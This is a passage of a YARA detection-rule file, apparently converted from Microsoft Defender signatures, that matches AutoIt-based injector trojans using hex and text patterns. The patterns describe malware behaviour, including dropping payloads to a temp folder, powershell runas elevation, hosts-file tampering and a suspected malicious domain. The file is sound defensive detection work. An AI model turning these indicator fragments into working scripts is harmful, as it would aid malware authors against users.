        $x_1_2 = {44 00 4c 00 4c 00 53 00 54 00 52 00 55 00 43 00 54 00 43 00 52 00 45 00 41 00 54 00 45 00 20 00 28 00 20 00 [0-30] 20 00 28 00 20 00 22 00 [0-30] 22 00 20 00 29 00 20 00 26 00 20 00 42 00 49 00 4e 00 41 00 52 00 59 00 4c 00 45 00 4e 00}  //weight: 1, accuracy: Low
        $x_1_3 = "&= CHR ( BITXOR ( ASC ( STRINGMID" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_SKL_2147917643_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.SKL!MTB"
        threat_id = "2147917643"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 00 20 00 45 00 58 00 45 00 43 00 55 00 54 00 45 00 20 00 28 00 20 00 22 00 43 00 68 00 22 00 20 00 26 00 20 00 22 00 72 00 28 00 24 00 [0-47] 29 00 22 00 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 45 58 45 43 55 54 45 20 28 20 22 43 68 22 20 26 20 22 72 28 24 [0-47] 29 22 20 29}  //weight: 1, accuracy: Low
        $x_1_3 = {46 00 49 00 4c 00 45 00 57 00 52 00 49 00 54 00 45 00 20 00 28 00 20 00 [0-42] 20 00 2c 00 20 00 22 00 [0-42] 22 00 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_4 = {46 49 4c 45 57 52 49 54 45 20 28 20 [0-42] 20 2c 20 22 [0-42] 22 20 29}  //weight: 1, accuracy: Low
        $x_1_5 = {46 00 49 00 4c 00 45 00 49 00 4e 00 53 00 54 00 41 00 4c 00 4c 00 20 00 28 00 20 00 22 00 [0-47] 22 00 20 00 2c 00 20 00 40 00 54 00 45 00 4d 00 50 00 44 00 49 00 52 00 20 00 26 00 20 00 22 00 5c 00 00 22 00 20 00 2c 00 20 00 31 00 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_6 = {46 49 4c 45 49 4e 53 54 41 4c 4c 20 28 20 22 [0-47] 22 20 2c 20 40 54 45 4d 50 44 49 52 20 26 20 22 5c 00 22 20 2c 20 31 20 29}  //weight: 1, accuracy: Low
        $x_1_7 = {52 00 45 00 47 00 57 00 52 00 49 00 54 00 45 00 20 00 28 00 20 00 24 00 [0-42] 20 00 2c 00 20 00 24 00 [0-42] 20 00 2c 00 20 00 22 00 [0-42] 22 00 20 00 2c 00 20 00 22 00 [0-42] 22 00 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_8 = {52 45 47 57 52 49 54 45 20 28 20 24 [0-42] 20 2c 20 24 [0-42] 20 2c 20 22 [0-42] 22 20 2c 20 22 [0-42] 22 20 29}  //weight: 1, accuracy: Low
        $x_1_9 = {52 00 45 00 47 00 44 00 45 00 4c 00 45 00 54 00 45 00 20 00 28 00 20 00 22 00 [0-42] 22 00 20 00 2c 00 20 00 24 00 [0-42] 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_10 = {52 45 47 44 45 4c 45 54 45 20 28 20 22 [0-42] 22 20 2c 20 24 [0-42] 20 29}  //weight: 1, accuracy: Low
        $x_1_11 = {53 00 54 00 52 00 49 00 4e 00 47 00 52 00 45 00 50 00 4c 00 41 00 43 00 45 00 20 00 28 00 20 00 24 00 [0-42] 20 00 2c 00 20 00 22 00 [0-42] 22 00 20 00 2c 00 20 00 24 00 [0-42] 20 00 2c 00 20 00 [0-42] 20 00 2c 00 20 00 [0-42] 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_12 = {53 54 52 49 4e 47 52 45 50 4c 41 43 45 20 28 20 24 [0-42] 20 2c 20 22 [0-42] 22 20 2c 20 24 [0-42] 20 2c 20 [0-42] 20 2c 20 [0-42] 20 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (6 of ($x*))
}

rule Trojan_Win32_AutoitInject_TEAA_2147917672_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.TEAA!MTB"
        threat_id = "2147917672"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "SHELLEXECUTE ( @WORKINGDIR & \"\\iyGRDanyb\\dYIoaczdR.exe\" )" ascii //weight: 2
        $x_1_2 = "SHELLEXECUTE ( @WORKINGDIR & \"\\iyGRDanyb\\" ascii //weight: 1
        $x_1_3 = "- Raccourci.lnk" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_SAV_2147918776_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.SAV!MTB"
        threat_id = "2147918776"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {45 00 58 00 45 00 43 00 55 00 54 00 45 00 20 00 28 00 20 00 22 00 [0-42] 22 00 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_2 = {45 58 45 43 55 54 45 20 28 20 22 [0-42] 22 20 29}  //weight: 1, accuracy: Low
        $x_1_3 = {46 00 49 00 4c 00 45 00 57 00 52 00 49 00 54 00 45 00 20 00 28 00 20 00 [0-42] 20 00 2c 00 20 00 [0-42] 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_4 = {46 49 4c 45 57 52 49 54 45 20 28 20 [0-42] 20 2c 20 [0-42] 20 29}  //weight: 1, accuracy: Low
        $x_1_5 = {46 00 49 00 4c 00 45 00 49 00 4e 00 53 00 54 00 41 00 4c 00 4c 00 20 00 28 00 20 00 22 00 [0-47] 22 00 20 00 2c 00 20 00 40 00 54 00 45 00 4d 00 50 00 44 00 49 00 52 00 20 00 26 00 20 00 22 00 5c 00 00 22 00 20 00 2c 00 20 00 31 00 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_6 = {46 49 4c 45 49 4e 53 54 41 4c 4c 20 28 20 22 [0-47] 22 20 2c 20 40 54 45 4d 50 44 49 52 20 26 20 22 5c 00 22 20 2c 20 31 20 29}  //weight: 1, accuracy: Low
        $x_1_7 = {52 00 45 00 47 00 57 00 52 00 49 00 54 00 45 00 20 00 28 00 20 00 24 00 [0-42] 20 00 2c 00 20 00 22 00 [0-42] 22 00 20 00 2c 00 20 00 22 00 [0-42] 22 00 20 00 2c 00 20 00 24 00 [0-42] 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_8 = {52 45 47 57 52 49 54 45 20 28 20 24 [0-42] 20 2c 20 22 [0-42] 22 20 2c 20 22 [0-42] 22 20 2c 20 24 [0-42] 20 29}  //weight: 1, accuracy: Low
        $x_1_9 = {52 00 45 00 47 00 44 00 45 00 4c 00 45 00 54 00 45 00 20 00 28 00 20 00 24 00 [0-42] 20 00 2c 00 20 00 [0-42] 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_10 = {52 45 47 44 45 4c 45 54 45 20 28 20 24 [0-42] 20 2c 20 [0-42] 20 29}  //weight: 1, accuracy: Low
        $x_1_11 = {53 00 54 00 52 00 49 00 4e 00 47 00 52 00 45 00 50 00 4c 00 41 00 43 00 45 00 20 00 28 00 20 00 [0-47] 2c 00 20 00 [0-47] 2c 00 20 00 24 00 [0-47] 2c 00 20 00 [0-42] 2c 00 20 00 [0-42] 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_12 = {53 54 52 49 4e 47 52 45 50 4c 41 43 45 20 28 20 [0-47] 2c 20 [0-47] 2c 20 24 [0-47] 2c 20 [0-42] 2c 20 [0-42] 20 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (6 of ($x*))
}

rule Trojan_Win32_AutoitInject_NB_2147919154_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.NB!MTB"
        threat_id = "2147919154"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "8"
        strings_accuracy = "High"
    strings:
        $x_3_1 = "rblxhubdeploy.rand744.nl" ascii //weight: 3
        $x_1_2 = "ExecQuery ( \"Select * from Win32_OperatingSystem\" )" ascii //weight: 1
        $x_1_3 = "SHELLEXECUTEWAIT ( \"powershell\" , \"start-process -verb runas 'cmd.exe' -argumentlist" ascii //weight: 1
        $x_1_4 = "webserver\\apache\\www" ascii //weight: 1
        $x_1_5 = "c:\\Windows\\System32\\Drivers\\etc\\hosts &&" ascii //weight: 1
        $x_1_6 = "_BINARYCALL_BASE64DECODE" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_NE_2147920143_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.NE!MTB"
        threat_id = "2147920143"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "10"
        strings_accuracy = "Low"
    strings:
        $x_3_1 = {46 00 49 00 4c 00 45 00 49 00 4e 00 53 00 54 00 41 00 4c 00 4c 00 20 00 28 00 20 00 22 00 [0-47] 22 00 20 00 2c 00 20 00 40 00 54 00 45 00 4d 00 50 00 44 00 49 00 52 00 20 00 26 00 20 00 22 00 5c 00 00 22 00 20 00 2c 00 20 00 31 00 20 00 29 00}  //weight: 3, accuracy: Low
        $x_3_2 = {46 49 4c 45 49 4e 53 54 41 4c 4c 20 28 20 22 [0-47] 22 20 2c 20 40 54 45 4d 50 44 49 52 20 26 20 22 5c 00 22 20 2c 20 31 20 29}  //weight: 3, accuracy: Low
        $x_1_3 = {3d 00 20 00 31 00 20 00 54 00 4f 00 20 00 [0-48] 20 00 28 00 20 00 24 00 [0-48] 20 00 29 00 20 00 53 00 54 00 45 00 50 00 20 00 33 00}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 20 31 20 54 4f 20 [0-48] 20 28 20 24 [0-48] 20 29 20 53 54 45 50 20 33}  //weight: 1, accuracy: Low
        $x_1_5 = {26 00 3d 00 20 00 53 00 54 00 52 00 49 00 4e 00 47 00 4d 00 49 00 44 00 20 00 28 00 20 00 24 00 [0-48] 20 00 2c 00 20 00 24 00 [0-48] 20 00 2c 00 20 00 31 00 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_6 = {26 3d 20 53 54 52 49 4e 47 4d 49 44 20 28 20 24 [0-48] 20 2c 20 24 [0-48] 20 2c 20 31 20 29}  //weight: 1, accuracy: Low
        $x_1_7 = {28 00 20 00 22 00 63 00 68 00 61 00 72 00 5b 00 22 00 20 00 26 00 20 00 53 00 54 00 52 00 49 00 4e 00 47 00 4c 00 45 00 4e 00 20 00 28 00 20 00 24 00 [0-48] 20 00 29 00 20 00 2b 00 20 00 31 00 20 00 26 00 20 00 22 00 5d 00 22 00 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_8 = {28 20 22 63 68 61 72 5b 22 20 26 20 53 54 52 49 4e 47 4c 45 4e 20 28 20 24 [0-48] 20 29 20 2b 20 31 20 26 20 22 5d 22 20 29}  //weight: 1, accuracy: Low
        $x_1_9 = {26 00 3d 00 20 00 43 00 48 00 52 00 20 00 28 00 20 00 [0-48] 20 00 28 00 20 00 24 00 [0-48] 20 00 29 00 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_10 = {26 3d 20 43 48 52 20 28 20 [0-48] 20 28 20 24 [0-48] 20 29 20 29}  //weight: 1, accuracy: Low
        $x_1_11 = {44 00 4c 00 4c 00 53 00 54 00 52 00 55 00 43 00 54 00 53 00 45 00 54 00 44 00 41 00 54 00 41 00 20 00 28 00 20 00 24 00 [0-48] 20 00 2c 00 20 00 31 00 20 00 2c 00 20 00 24 00 [0-48] 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_12 = {44 4c 4c 53 54 52 55 43 54 53 45 54 44 41 54 41 20 28 20 24 [0-48] 20 2c 20 31 20 2c 20 24 [0-48] 20 29}  //weight: 1, accuracy: Low
        $x_1_13 = {49 00 46 00 20 00 53 00 54 00 52 00 49 00 4e 00 47 00 4c 00 45 00 46 00 54 00 20 00 28 00 20 00 24 00 [0-48] 20 00 2c 00 20 00 32 00 20 00 29 00 20 00 3d 00 20 00 22 00 [0-16] 22 00 20 00 54 00 48 00 45 00 4e 00}  //weight: 1, accuracy: Low
        $x_1_14 = {49 46 20 53 54 52 49 4e 47 4c 45 46 54 20 28 20 24 [0-48] 20 2c 20 32 20 29 20 3d 20 22 [0-16] 22 20 54 48 45 4e}  //weight: 1, accuracy: Low
        $x_1_15 = "= DLLCALL ( DLLOPEN (" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((10 of ($x_1_*))) or
            ((1 of ($x_3_*) and 7 of ($x_1_*))) or
            ((2 of ($x_3_*) and 4 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win32_AutoitInject_SKM_2147920199_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.SKM!MTB"
        threat_id = "2147920199"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {46 00 49 00 4c 00 45 00 49 00 4e 00 53 00 54 00 41 00 4c 00 4c 00 20 00 28 00 20 00 22 00 [0-47] 22 00 20 00 2c 00 20 00 40 00 54 00 45 00 4d 00 50 00 44 00 49 00 52 00 20 00 26 00 20 00 22 00 5c 00 00 22 00 20 00 2c 00 20 00 31 00 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_2 = {46 49 4c 45 49 4e 53 54 41 4c 4c 20 28 20 22 [0-47] 22 20 2c 20 40 54 45 4d 50 44 49 52 20 26 20 22 5c 00 22 20 2c 20 31 20 29}  //weight: 1, accuracy: Low
        $x_1_3 = {45 00 58 00 45 00 43 00 55 00 54 00 45 00 20 00 28 00 20 00 22 00 [0-42] 22 00 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_4 = {45 58 45 43 55 54 45 20 28 20 22 [0-42] 22 20 29}  //weight: 1, accuracy: Low
        $x_1_5 = {57 00 49 00 4e 00 41 00 43 00 54 00 49 00 56 00 41 00 54 00 45 00 20 00 28 00 20 00 22 00 [0-47] 22 00 20 00 2c 00 20 00 24 00 [0-47] 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_6 = {57 49 4e 41 43 54 49 56 41 54 45 20 28 20 22 [0-47] 22 20 2c 20 24 [0-47] 20 29}  //weight: 1, accuracy: Low
        $x_1_7 = {46 00 49 00 4c 00 45 00 57 00 52 00 49 00 54 00 45 00 4c 00 49 00 4e 00 45 00 20 00 28 00 20 00 [0-42] 20 00 2c 00 20 00 22 00 [0-47] 22 00 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_8 = {46 49 4c 45 57 52 49 54 45 4c 49 4e 45 20 28 20 [0-42] 20 2c 20 22 [0-47] 22 20 29}  //weight: 1, accuracy: Low
        $x_1_9 = {52 00 45 00 47 00 57 00 52 00 49 00 54 00 45 00 20 00 28 00 20 00 24 00 [0-47] 20 00 2c 00 20 00 22 00 [0-47] 22 00 20 00 2c 00 20 00 24 00 00 20 00 2c 00 20 00 22 00 [0-47] 22 00 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_10 = {52 45 47 57 52 49 54 45 20 28 20 24 [0-47] 20 2c 20 22 [0-47] 22 20 2c 20 24 00 20 2c 20 22 [0-47] 22 20 29}  //weight: 1, accuracy: Low
        $x_1_11 = {50 00 49 00 58 00 45 00 4c 00 43 00 48 00 45 00 43 00 4b 00 53 00 55 00 4d 00 20 00 28 00 20 00 [0-42] 20 00 2c 00 20 00 [0-42] 20 00 2c 00 20 00 [0-42] 20 00 2c 00 20 00 [0-42] 20 00 2c 00 20 00 [0-42] 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_12 = {50 49 58 45 4c 43 48 45 43 4b 53 55 4d 20 28 20 [0-42] 20 2c 20 [0-42] 20 2c 20 [0-42] 20 2c 20 [0-42] 20 2c 20 [0-42] 20 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (6 of ($x*))
}

rule Trojan_Win32_AutoitInject_SAI_2147920289_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.SAI!MTB"
        threat_id = "2147920289"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {45 00 58 00 45 00 43 00 55 00 54 00 45 00 20 00 28 00 20 00 22 00 [0-42] 22 00 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_2 = {45 58 45 43 55 54 45 20 28 20 22 [0-42] 22 20 29}  //weight: 1, accuracy: Low
        $x_1_3 = {46 00 49 00 4c 00 45 00 57 00 52 00 49 00 54 00 45 00 20 00 28 00 20 00 [0-42] 20 00 2c 00 20 00 [0-42] 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_4 = {46 49 4c 45 57 52 49 54 45 20 28 20 [0-42] 20 2c 20 [0-42] 20 29}  //weight: 1, accuracy: Low
        $x_1_5 = {46 00 49 00 4c 00 45 00 49 00 4e 00 53 00 54 00 41 00 4c 00 4c 00 20 00 28 00 20 00 22 00 [0-47] 22 00 20 00 2c 00 20 00 40 00 54 00 45 00 4d 00 50 00 44 00 49 00 52 00 20 00 26 00 20 00 22 00 5c 00 00 22 00 20 00 2c 00 20 00 31 00 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_6 = {46 49 4c 45 49 4e 53 54 41 4c 4c 20 28 20 22 [0-47] 22 20 2c 20 40 54 45 4d 50 44 49 52 20 26 20 22 5c 00 22 20 2c 20 31 20 29}  //weight: 1, accuracy: Low
        $x_1_7 = {52 00 45 00 47 00 57 00 52 00 49 00 54 00 45 00 20 00 28 00 20 00 24 00 [0-42] 20 00 2c 00 20 00 22 00 [0-42] 22 00 20 00 2c 00 20 00 [0-42] 20 00 2c 00 20 00 24 00 [0-42] 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_8 = {52 45 47 57 52 49 54 45 20 28 20 24 [0-42] 20 2c 20 22 [0-42] 22 20 2c 20 [0-42] 20 2c 20 24 [0-42] 20 29}  //weight: 1, accuracy: Low
        $x_1_9 = {52 00 45 00 47 00 44 00 45 00 4c 00 45 00 54 00 45 00 20 00 28 00 20 00 24 00 [0-42] 20 00 2c 00 20 00 [0-42] 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_10 = {52 45 47 44 45 4c 45 54 45 20 28 20 24 [0-42] 20 2c 20 [0-42] 20 29}  //weight: 1, accuracy: Low
        $x_1_11 = {53 00 54 00 52 00 49 00 4e 00 47 00 52 00 45 00 47 00 45 00 58 00 50 00 52 00 45 00 50 00 4c 00 41 00 43 00 45 00 20 00 28 00 20 00 24 00 [0-47] 20 00 2c 00 20 00 22 00 [0-47] 22 00 20 00 2c 00 20 00 22 00 [0-47] 22 00 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_12 = {53 54 52 49 4e 47 52 45 47 45 58 50 52 45 50 4c 41 43 45 20 28 20 24 [0-47] 20 2c 20 22 [0-47] 22 20 2c 20 22 [0-47] 22 20 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (6 of ($x*))
}

rule Trojan_Win32_AutoitInject_SAI_2147920289_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.SAI!MTB"
        threat_id = "2147920289"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {46 00 49 00 4c 00 45 00 49 00 4e 00 53 00 54 00 41 00 4c 00 4c 00 20 00 28 00 20 00 22 00 [0-47] 22 00 20 00 2c 00 20 00 40 00 54 00 45 00 4d 00 50 00 44 00 49 00 52 00 20 00 26 00 20 00 22 00 5c 00 00 22 00 20 00 2c 00 20 00 31 00 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_2 = {46 49 4c 45 49 4e 53 54 41 4c 4c 20 28 20 22 [0-47] 22 20 2c 20 40 54 45 4d 50 44 49 52 20 26 20 22 5c 00 22 20 2c 20 31 20 29}  //weight: 1, accuracy: Low
        $x_1_3 = {53 00 54 00 52 00 49 00 4e 00 47 00 52 00 45 00 47 00 45 00 58 00 50 00 52 00 45 00 50 00 4c 00 41 00 43 00 45 00 20 00 28 00 20 00 22 00 [0-47] 22 00 20 00 2c 00 20 00 22 00 34 00 37 00 22 00 20 00 2c 00 20 00 22 00 [0-47] 22 00 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_4 = {53 54 52 49 4e 47 52 45 47 45 58 50 52 45 50 4c 41 43 45 20 28 20 22 [0-47] 22 20 2c 20 22 34 37 22 20 2c 20 22 [0-47] 22 20 29}  //weight: 1, accuracy: Low
        $x_1_5 = {53 00 54 00 52 00 49 00 4e 00 47 00 53 00 50 00 4c 00 49 00 54 00 20 00 28 00 20 00 22 00 [0-42] 22 00 20 00 2c 00 20 00 22 00 [0-42] 22 00 20 00 2c 00 20 00 34 00 38 00 36 00 32 00 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_6 = {53 54 52 49 4e 47 53 50 4c 49 54 20 28 20 22 [0-42] 22 20 2c 20 22 [0-42] 22 20 2c 20 34 38 36 32 20 29}  //weight: 1, accuracy: Low
        $x_1_7 = {45 00 58 00 45 00 43 00 55 00 54 00 45 00 20 00 28 00 20 00 22 00 [0-42] 22 00 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_8 = {45 58 45 43 55 54 45 20 28 20 22 [0-42] 22 20 29}  //weight: 1, accuracy: Low
        $x_1_9 = {52 00 45 00 47 00 52 00 45 00 41 00 44 00 20 00 28 00 20 00 22 00 [0-42] 22 00 20 00 2c 00 20 00 22 00 [0-42] 22 00 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_10 = {52 45 47 52 45 41 44 20 28 20 22 [0-42] 22 20 2c 20 22 [0-42] 22 20 29}  //weight: 1, accuracy: Low
        $x_1_11 = {46 00 49 00 4c 00 45 00 44 00 45 00 4c 00 45 00 54 00 45 00 20 00 28 00 20 00 22 00 [0-42] 22 00 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_12 = {46 49 4c 45 44 45 4c 45 54 45 20 28 20 22 [0-42] 22 20 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (6 of ($x*))
}

rule Trojan_Win32_AutoitInject_NG_2147920622_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.NG!MTB"
        threat_id = "2147920622"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "10"
        strings_accuracy = "Low"
    strings:
        $x_3_1 = {46 00 49 00 4c 00 45 00 49 00 4e 00 53 00 54 00 41 00 4c 00 4c 00 20 00 28 00 20 00 22 00 [0-47] 22 00 20 00 2c 00 20 00 40 00 54 00 45 00 4d 00 50 00 44 00 49 00 52 00 20 00 26 00 20 00 22 00 5c 00 00 22 00 20 00 2c 00 20 00 31 00 20 00 29 00}  //weight: 3, accuracy: Low
        $x_3_2 = {46 49 4c 45 49 4e 53 54 41 4c 4c 20 28 20 22 [0-47] 22 20 2c 20 40 54 45 4d 50 44 49 52 20 26 20 22 5c 00 22 20 2c 20 31 20 29}  //weight: 3, accuracy: Low
        $x_1_3 = "= EXECUTE ( \"ObjCreate(" ascii //weight: 1
        $x_1_4 = {3d 00 20 00 45 00 58 00 45 00 43 00 55 00 54 00 45 00 20 00 28 00 20 00 22 00 24 00 [0-48] 2e 00 4f 00 70 00 65 00 6e 00 54 00 65 00 78 00 74 00 46 00 69 00 6c 00 65 00 28 00 40 00 54 00 65 00 6d 00 70 00 44 00 69 00 72 00}  //weight: 1, accuracy: Low
        $x_1_5 = {3d 20 45 58 45 43 55 54 45 20 28 20 22 24 [0-48] 2e 4f 70 65 6e 54 65 78 74 46 69 6c 65 28 40 54 65 6d 70 44 69 72}  //weight: 1, accuracy: Low
        $x_1_6 = {3d 00 20 00 45 00 58 00 45 00 43 00 55 00 54 00 45 00 20 00 28 00 20 00 22 00 24 00 [0-48] 2e 00 52 00 65 00 61 00 64 00 41 00 6c 00 6c 00 28 00 29 00 22 00 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_7 = {3d 20 45 58 45 43 55 54 45 20 28 20 22 24 [0-48] 2e 52 65 61 64 41 6c 6c 28 29 22 20 29}  //weight: 1, accuracy: Low
        $x_1_8 = {45 00 58 00 45 00 43 00 55 00 54 00 45 00 20 00 28 00 20 00 22 00 24 00 [0-48] 2e 00 43 00 6c 00 6f 00 73 00 65 00 28 00 29 00 22 00 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_9 = {45 58 45 43 55 54 45 20 28 20 22 24 [0-48] 2e 43 6c 6f 73 65 28 29 22 20 29}  //weight: 1, accuracy: Low
        $x_1_10 = {57 00 48 00 49 00 4c 00 45 00 20 00 24 00 [0-48] 20 00 3c 00 3d 00 20 00 53 00 54 00 52 00 49 00 4e 00 47 00 4c 00 45 00 4e 00 20 00 28 00}  //weight: 1, accuracy: Low
        $x_1_11 = {57 48 49 4c 45 20 24 [0-48] 20 3c 3d 20 53 54 52 49 4e 47 4c 45 4e 20 28}  //weight: 1, accuracy: Low
        $x_1_12 = "i6044B184n6044B184t6044B184" ascii //weight: 1
        $x_1_13 = "S6044B184c6044B184r6044B184i6044B184p6044B184t6044B184i6044B184n6044B184g6044B184" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((10 of ($x_1_*))) or
            ((1 of ($x_3_*) and 7 of ($x_1_*))) or
            ((2 of ($x_3_*) and 4 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win32_AutoitInject_NJ_2147920722_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.NJ!MTB"
        threat_id = "2147920722"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "8"
        strings_accuracy = "Low"
    strings:
        $x_3_1 = {46 00 49 00 4c 00 45 00 49 00 4e 00 53 00 54 00 41 00 4c 00 4c 00 20 00 28 00 20 00 22 00 [0-47] 22 00 20 00 2c 00 20 00 40 00 54 00 45 00 4d 00 50 00 44 00 49 00 52 00 20 00 26 00 20 00 22 00 5c 00 00 22 00 20 00 2c 00 20 00 31 00 20 00 29 00}  //weight: 3, accuracy: Low
        $x_3_2 = {46 49 4c 45 49 4e 53 54 41 4c 4c 20 28 20 22 [0-47] 22 20 2c 20 40 54 45 4d 50 44 49 52 20 26 20 22 5c 00 22 20 2c 20 31 20 29}  //weight: 3, accuracy: Low
        $x_1_3 = {4f 00 70 00 65 00 6e 00 54 00 65 00 78 00 74 00 46 00 69 00 6c 00 65 00 20 00 28 00 20 00 40 00 54 00 45 00 4d 00 50 00 44 00 49 00 52 00 20 00 26 00 20 00 22 00 5c 00 [0-48] 22 00 20 00 2c 00 20 00 31 00 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_4 = {4f 70 65 6e 54 65 78 74 46 69 6c 65 20 28 20 40 54 45 4d 50 44 49 52 20 26 20 22 5c [0-48] 22 20 2c 20 31 20 29}  //weight: 1, accuracy: Low
        $x_1_5 = "EXECUTE ( \"Str\" & \"ingLen(" ascii //weight: 1
        $x_1_6 = "&= EXECUTE ( \"Stri\" & \"ngMid(" ascii //weight: 1
        $x_1_7 = "OBJCREATE ( \"Scripting.FileSystemObject\" )" ascii //weight: 1
        $x_1_8 = "d.wuoMrfdx" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_3_*) and 5 of ($x_1_*))) or
            ((2 of ($x_3_*) and 2 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win32_AutoitInject_WEAA_2147920777_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.WEAA!MTB"
        threat_id = "2147920777"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "7"
        strings_accuracy = "High"
    strings:
